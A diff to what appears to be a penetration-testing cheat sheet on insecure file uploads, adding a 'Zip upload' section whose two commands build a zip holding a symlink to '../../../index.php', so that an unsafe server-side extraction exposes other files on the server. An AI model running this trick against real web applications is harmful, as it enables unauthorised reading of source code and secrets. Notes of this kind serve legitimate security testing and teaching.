@@ -31,6 +31,14 @@ Error if a same named file already exists
 3. Modify the upload with burp
 4. Send directly the file to the upload point
 
+## Zip upload
+***Unsecure deflation :***  
+Using symlink to access other files
+```bash
+ln -s ../../../index.php symindex.txt # Where index.php is the targeted file
+zip --symlinks test.zip symindex.txt # Preserve symlinks
+```
+
 # Tips :
 ### Useful links
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
